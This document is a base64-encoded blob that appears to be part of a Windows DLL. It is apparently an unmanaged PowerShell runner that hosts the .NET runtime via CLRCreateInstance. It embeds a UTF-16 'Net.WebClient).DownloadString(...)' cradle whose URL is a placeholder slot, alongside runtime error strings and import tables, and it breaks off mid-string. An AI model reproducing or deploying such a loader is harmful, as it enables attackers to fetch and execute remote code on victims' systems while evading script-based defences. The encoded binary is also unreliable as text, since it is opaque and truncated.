ABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBACIAKQApACkAKQAAAEYAYQBpAGwAZQBkACAAdABvACAAZwBlAHQAIAB0AGgAZQAgAFQAeQBwAGUAIABpAG4AdABlAHIAZgBhAGMAZQAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAEYAYQBpAGwAZQBkACAAdABvACAAbABvAGEAZAAgAHQAaABlACAAYQBzAHMAZQBtAGIAbAB5ACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAABGAGEAaQBsAGUAZAAgAHQAbwAgAGcAZQB0ACAAZABlAGYAYQB1AGwAdAAgAEEAcABwAEQAbwBtAGEAaQBuACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAANyW9gUpK2M2rYvEOJzypxMAAAAASQBDAG8AcgBSAHUAbgB0AGkAbQBlAEgAbwBzAHQAOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQARABvAG0AYQBpAG4AIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAEMATABSACAAZgBhAGkAbABlAGQAIAB0AG8AIABzAHQAYQByAHQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAAAAAAEkAQwBMAFIAUgB1AG4AdABpAG0AZQBJAG4AZgBvADoAOgBHAGUAdABJAG4AdABlAHIAZgBhAGMAZQAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAImcvyzqr0hGcQADAT6MKPi4ATgBFAFQAIAByAHUAbgB0AGkAbQBlACAAdgAyAC4AMAAuADUAMAA3ADIANwAgAGMAYQBuAG4AbwB0ACAAYgBlACAAbABvAGEAZABlAGQACgAAAAAAAABJAEMATABSAFIAdQBuAHQAaQBtAGUASQBuAGYAbwA6ADoASQBzAEwAbwBhAGQAYQBiAGwAZQAgAGYAYQBpAGwAZQBkACAAdwAvAGgAcgAgADAAeAAlADAAOABsAHgACgAAAAAAAAAAAEkAQwBMAFIATQBlAHQAYQBIAG8AcwB0ADoAOgBHAGUAdABSAHUAbgB0AGkAbQBlACAAZgBhAGkAbABlAGQAIAB3AC8AaAByACAAMAB4ACUAMAA4AGwAeAAKAAAAdgAyAC4AMAAuADUAMAA3ADIANwAAAAAA0tE5vS+6akiJsLSwy0ZokQAAAABDAEwAUgBDAHIAZQBhAHQAZQBJAG4AcwB0AGEAbgBjAGUAIABmAGEAaQBsAGUAZAAgAHcALwBoAHIAIAAwAHgAJQAwADgAbAB4AAoAAAAAAJ7bMtOzuSVBggehSIT1MhZQb3dlclNoZWxsUnVubmVyLlBvd2VyU2hlbGxSdW5uZXIAAABQb3dlclNoZWxsUnVubmVyAAAAAPgIARAOGQAQCyUAEGJhZCBhbGxvY2F0aW9uAAAAAAAAeAkBEN0lABALJQAQVW5rbm93biBleGNlcHRpb24AAACMCQEQOSYAEGNzbeABAAAAAAAAAAAAAAADAAAAIAWTGQAAAAAAAAAABisAENQJARAQKQAQCyUAEGJhZCBleGNlcHRpb24AAABLAEUAUgBOAEUATAAzADIALgBEAEwATAAAAAAARmxzRnJlZQBGbHNTZXRWYWx1ZQBGbHNHZXRWYWx1ZQBGbHNBbGxvYwAAAADoaQEQQGoBEENvckV4aXRQcm9jZXNzAABtAHMAYwBvAHIAZQBlAC4AZABsAGwAAAAFAADACwAAAAAAAAAdAADABAAAAAAAAACWAADABAAAAAAAAACNAADACAAAAAAAAACOAADACAAAAAAAAACPAADACAAAAAAAAACQAADACAAAAAAAAACRAADACAAAAAAAAACSAADACAAAAAAAAACTAADACAAAAAAAAAC0AgDACAAAAAAAAAC1AgDACAAAAAAAAAADAAAACQAAAJAAAAAMAAAAcgB1AG4AdABpAG0AZQAgAGUAcgByAG8AcgAgAAAAAAANAAoAAAAAAFQATABPAFMAUwAgAGUAcgByAG8AcgANAAoAAABTAEkATgBHACAAZQByAHIAbwByAA0ACgAAAAAARABPAE0AQQBJAE4AIABlAHIAcgBvAHIADQAKAAAAAABSADYAMAAzADMADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAdQBzAGUAIABNAFMASQBMACAAYwBvAGQAZQAgAGYAcgBvAG0AIAB0AGgAaQBzACAAYQBzAHMAZQBtAGIAbAB5ACAAZAB1AHIAaQBuAGcAIABuAGEAdABpAHYAZQAgAGMAbwBkAGUAIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4AIABJAHQAIABpAHMAIABtAG8AcwB0ACAAbABpAGsAZQBsAHkAIAB0AGgAZQAgAHIAZQBzAHUAbAB0ACAAbwBmACAAYwBhAGwAbABpAG4AZwAgAGEAbgAgAE0AUwBJAEwALQBjAG8AbQBwAGkAbABlAGQAIAAoAC8AYwBsAHIAKQAgAGYAdQBuAGMAdABpAG8AbgAgAGYAcgBvAG0AIABhACAAbgBhAHQAaQB2AGUAIABjAG8AbgBzAHQAcgB1AGMAdABvAHIAIABvAHIAIABmAHIAbwBtACAARABsAGwATQBhAGkAbgAuAA0ACgAAAAAAUgA2ADAAMwAyAA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAGMAYQBsAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4ADQAKAAAAAABSADYAMAAzADEADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAHQAaABlACAAQwBSAFQAIABtAG8AcgBlACAAdABoAGEAbgAgAG8AbgBjAGUALgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgANAAoAAAAAAFIANgAwADMAMAANAAoALQAgAEMAUgBUACAAbgBvAHQAIABpAG4AaQB0AGkAYQBsAGkAegBlAGQADQAKAAAAAABSADYAMAAyADgADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABoAGUAYQBwAA0ACgAAAAAAAAAAAFIANgAwADIANwANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwB3AGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMQA5AA0ACgAtACAAdQBuAGEAYgBsAGUAIAB0AG8AIABvAHAAZQBuACAAYwBvAG4AcwBvAGwAZQAgAGQAZQB2AGkAYwBlAA0ACgAAAAAAAAAAAFIANgAwADEAOAANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABoAGUAYQBwACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEANwANAAoALQAgAHUAbgBlAHgAcABlAGMAdABlAGQAIABtAHUAbAB0AGkAdABoAHIAZQBhAGQAIABsAG8AYwBrACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFIANgAwADEANgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAHQAaAByAGUAYQBkACAAZABhAHQAYQANAAoAAABSADYAMAAxADAADQAKAC0AIABhAGIAbwByAHQAKAApACAAaABhAHMAIABiAGUAZQBuACAAYwBhAGwAbABlAGQADQAKAAAAAABSADYAMAAwADkADQAKAC0AIABuAG8AdAAgAGUAb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nVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgZHluYW1pYyBhdGV4aXQgZGVzdHJ1Y3RvciBmb3IgJwAAAABgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAYGVoIHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgb21uaSBjYWxsc2lnJwAAIGRlbGV0ZVtdAAAAIG5ld1tdAABgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwBgbG9jYWwgdmZ0YWJsZScAYFJUVEkAAABgRUgAYHVkdCByZXR1cm5pbmcnAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAABgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmlydHVhbCBkaXNwbGFjZW1lbnQgbWFwJwAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBzY2FsYXIgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAYHN0cmluZycAAAAAYGxvY2FsIHN0YXRpYyBndWFyZCcAAAAAYHR5cGVvZicAAAAAYHZjYWxsJwBgdmJ0YWJsZScAAABgdmZ0YWJsZScAAABePQAAfD0AACY9AAA8PD0APj49ACU9AAAvPQAALT0AACs9AAAqPQAAfHwAACYmAAB8AAAAXgAAAH4AAAAoKQAALAAAAD49AAA+AAAAPD0AADwAAAAlAAAALwAAAC0+KgAmAAAAKwAAAC0AAAAtLQAAKysAACoAAAAtPgAAb3BlcmF0b3IAAAAAW10AACE9AAA9PQAAIQAAADw8AAA+PgAAPQAAACBkZWxldGUAIG5ldwAAAABfX3VuYWxpZ25lZABfX3Jlc3RyaWN0AABfX3B0cjY0AF9fZWFiaQAAX19jbHJjYWxsAAAAX19mYXN0Y2FsbAAAX190aGlzY2FsbAAAX19zdGRjYWxsAAAAX19wYXNjYWwAAAAAX19jZGVjbABfX2Jhc2VkKAAAAAB8/QAQdP0AEGj9ABBc/QAQUP0AEET9ABA4/QAQMP0AECj9ABAc/QAQEP0AEA39ABAI/QAQAP0AEPz8ABD4/AAQ9PwAEPD8ABDs/AAQ6PwAEOT8ABDY/AAQ1PwAEND8ABDM/AAQyPwAEMT8ABDA/AAQvPwAELj8ABC0/AAQsPwAEKz8ABCo/AAQpPwAEKD8ABCc/AAQmPwAEJT8ABCQ/AAQjPwAEIj8ABCE/AAQgPwAEHz8ABB4/AAQdPwAEHD8ABBs/AAQaPwAEGT8ABBg/AAQXPwAEFD8ABBE/AAQPPwAEDD8ABAY/AAQDPwAEPj7ABDY+wAQuPsAEJj7ABB4+wAQWPsAEDT7ABAY+wAQ9PoAENT6ABCs+gAQkPoAEID6ABB8+gAQdPoAEGT6ABBA+gAQOPoAECz6ABAc+gAQAPoAEOD5ABC4+QAQkPkAEGj5ABA8+QAQIPkAEPz4ABDY+AAQrPgAEID4ABBk+AAQDf0AEFD4ABA0+AAQIPgAEAD4ABDk9wAQR2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AR2V0VXNlck9iamVjdEluZm9ybWF0aW9uVwAAAEdldExhc3RBY3RpdmVQb3B1cAAAR2V0QWN0aXZlV2luZG93AE1lc3NhZ2VCb3hXAFUAUwBFAFIAMwAyAC4ARABMAEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACEAIQAhACEAIQAhACEAIQAhACEABAAEAAQABAAEAAQABAAgQCBAIEAgQCBAIEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABABAAEAAQABAAEAAQAIIAggCCAIIAggCCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAQABAAEAAQACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAaAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEBgQGBAYEBgQGBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQABAAEAAQABAAEACCAYIBg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gWTGQEAAABQCgEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIgWTGQUAAACgCgEQAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAA/////1XYABAAAAAAXdgAEAEAAABl2AAQAgAAAG3YABADAAAAddgAEAAAAAADGQAQAAAAANgKARACAAAA5AoBEAALARAAAAAAAFgBEAAAAAD/////AAAAAAwAAAA1GQAQAAAAABxYARAAAAAA/////wAAAAAMAAAABCYAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAADhHgAQAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAEgjABAAAAAA/v///wAAAADU////AAAAAP7///+oJAAQuSQAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAACXJwAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAKEqABAAAAAAYyoAEG0qABD+////AAAAANj///8AAAAA/v///0krABBSKwAQQAAAAAAAAAAAAAAAKywAEP////8AAAAA/////wAAAAAAAAAAAAAAAAEAAAABAAAA5AsBECIFkxkCAAAA9AsBEAEAAAAEDAEQAAAAAAAAAAAAAAAAAQAAAAAAAAD+////AAAAALT///8AAAAA/v///wAAAABjLQAQAAAAANMsABDcLAAQ/v///wAAAADU////AAAAAP7///9KLwAQTi8AEAAAAAD+////AAAAANj///8AAAAA/v///+MvABDnLwAQAAAAAAUpABAAAAAAtAwBEAIAAADADAEQAAsBEAAAAABYWAEQAAAAAP////8AAAAADAAAANo0ABAAAAAA/v///wAAAADY////AAAAAP7///8AAAAA/DYAEP7///8AAAAACzcAEP7///8AAAAA2P///wAAAAD+////AAAAAL44ABD+////AAAAAMo4ABD+////AAAAANj///8AAAAA/v///986ABDjOgAQAAAAAP7///8AAAAA2P///wAAAAD+////LzsAEDM7ABAAAAAA/v///wAAAADA////AAAAAP7///8AAAAAn1QAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAyXwAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAHpjABAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAXmoAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAlbQAQAAAAAP7///8AAAAAzP///wAAAAD+////AAAAAPdwABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAYnMAEAAAAAD+////AAAAAMz///8AAAAA/v///wAAAADsdAAQAAAAAAAAAAC4dAAQ/v///wAAAADY////AAAAAP7///9bfAAQbnwAEAAAAAD+////AAAAAMD///8AAAAA/v///wAAAAB+fwAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAANyMABAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAArZQAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAACGlQAQAAAAAP7///8AAAAA0P///wAAAAD+////AAAAACGcABAAAAAA/v///wAAAADM////AAAAAP7///8AAAAABJ4AEAAAAAD+////AAAAANT///8AAAAA/v///wAAAAC7nwAQAAAAAOT///8AAAAAyP///wAAAAD+////h6QAEI2kABAAAAAAYKUAEAAAAACkDwEQAQAAAKwPARAAAAAAVGYBEAAAAAD/////AAAAABAAAADQpQAQ/v///wAAAADY////AAAAAP7////l1wAQAdgAEDQQAQAAAAAAAAAAAIwRAQAA4AAAQBEBAAAAAAAAAAAAmhEBAAzhAABsEQEAAAAAAAAAAAC8EQEAOOEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdBEBAE4WAQBCFgEANBYBACQWAQASFgEAAhYBAPQVAQDgFQEAyBEBANQRAQDqEQEA+hEBAAwSAQAcEgEAKBIBADoSAQBKEgEAVhIBAGISAQBwEgEAfhIBAIgSAQCgEgEAtBIBAMQSAQDWEgEA6hIBAP4SAQAaEwEAOBMBAEwTAQBkEwEAfBMBAJgTAQCgEwEArhMBAMATAQDQEwEA+BMBAAYUAQAYFAEAMBQBAEYUAQBgFAEAdhQBAJAUAQCeFAEArBQBAMYUAQDWFAEA7BQBAAYVAQASFQEAHhUBADQVAQBAFQEAShUBAFYVAQBoFQEAfhUBAIwVAQCcFQEArBUBAL4VAQDOFQEAAAAAABAAAIAPAACAFQAAgBYAAICbAQCAGgAAgAkAAIAIAACABgAAgAIAAIAAAAAAqBEBAAAAAADrAkludGVybG9ja2VkRGVjcmVtZW50AABLRVJORUwzMi5kbGwAAE9MRUFVVDMyLmRsbAAAAABDTFJDcmVhdGVJbnN0YW5jZQBtc2NvcmVlLmRsbAAYBFJ0bFVud2luZADFAUdldEN1cnJlbnRUaHJlYWRJZAAAygBEZWNvZGVQb2ludGVyAIYBR2V0Q29tbWFuZExpbmVBAOoARW5jb2RlUG9pbnRlcgDLAkhlYXBBbGxvYwCxA1JhaXNlRXhjZXB0aW9uAAACAkdldExhc3RFcnJvcgAAzwJIZWFwRnJlZQAAxQRUbHNBbGxvYwAAxwRUbHNHZXRWYWx1ZQDIBFRsc1NldFZhbHVlAMYEVGxzRnJlZQDvAkludGVybG9ja2VkSW5jcmVtZW50AAAYAkdldE1vZHVsZUhhbmRsZVcAAHMEU2V0TGFzdEVycm9yAABFAkdldFByb2NBZGRyZXNzAADABFRlcm1pbmF0ZVByb2Nl